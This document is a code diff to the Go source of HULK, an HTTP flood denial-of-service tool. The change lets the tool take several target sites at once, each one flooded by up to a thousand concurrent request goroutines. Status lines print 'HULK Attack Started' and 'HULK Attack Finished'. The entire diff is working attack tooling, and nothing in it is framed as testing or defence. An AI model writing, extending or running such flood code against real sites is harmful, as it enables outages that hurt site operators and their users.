@@ -23,13 +23,13 @@ import (
 	"syscall"
 )
 
-const __version__  = "1.0.1"
+const __version__ = "1.0.1"
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
-	callGotOk              uint8 = iota
+	callGotOk uint8 = iota
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
@@ -77,7 +77,7 @@ func (i *arrayFlags) Set(value string) error {
 func main() {
 	var (
 		version bool
-		site    string
+		sites   arrayFlags
 		agents  string
 		data    string
 		headers arrayFlags
@@ -85,7 +85,7 @@ func main() {
 
 	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
-	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
+	flag.Var(&sites, "site", "Destination sites. Could be used multiple times")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
@@ -95,12 +95,6 @@ func main() {
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
 		maxproc = 1023
-	}
-
-	u, err := url.Parse(site)
-	if err != nil {
-		fmt.Println("err parsing url parameter\n")
-		os.Exit(1)
 	}
 
 	if version {
@@ -123,42 +117,52 @@ func main() {
 		}
 	}
 
-	go func() {
+	for _, site := range sites {
 		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
-		ss := make(chan uint8, 8)
-		var (
-			err, sent int32
-		)
-		fmt.Println("In use               |\tResp OK |\tGot err")
-		for {
-			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
-				go httpcall(site, u.Host, data, headers, ss)
-			}
-			if sent%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-			}
-			switch <-ss {
-			case callExitOnErr:
-				atomic.AddInt32(&cur, -1)
-				err++
-			case callExitOnTooManyFiles:
-				atomic.AddInt32(&cur, -1)
-				maxproc--
-			case callGotOk:
-				sent++
-			case targetComplete:
-				sent++
-				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
-				os.Exit(0)
-			}
-		}
-	}()
+		go runForSite(site, maxproc, data, headers)
+	}
 
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
 	fmt.Println("\r\n-- Interrupted by user --        \n")
+}
+
+func runForSite(site string, maxproc int, data string, headers arrayFlags) {
+	var (
+		err, sent int32
+	)
+	u, e := url.Parse(site)
+	if e != nil {
+		fmt.Printf("err parsing %s parameter\n", site)
+		return
+	}
+
+	ss := make(chan uint8, 8)
+	fmt.Println("In use               |\tResp OK |\tGot err")
+	for {
+		if atomic.LoadInt32(&cur) < int32(maxproc-1) {
+			go httpcall(site, u.Host, data, headers, ss)
+		}
+		if sent%10 == 0 {
+			fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+		}
+		switch <-ss {
+		case callExitOnErr:
+			atomic.AddInt32(&cur, -1)
+			err++
+		case callExitOnTooManyFiles:
+			atomic.AddInt32(&cur, -1)
+			maxproc--
+		case callGotOk:
+			sent++
+		case targetComplete:
+			sent++
+			fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+			fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+			os.Exit(0)
+		}
+	}
 }
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
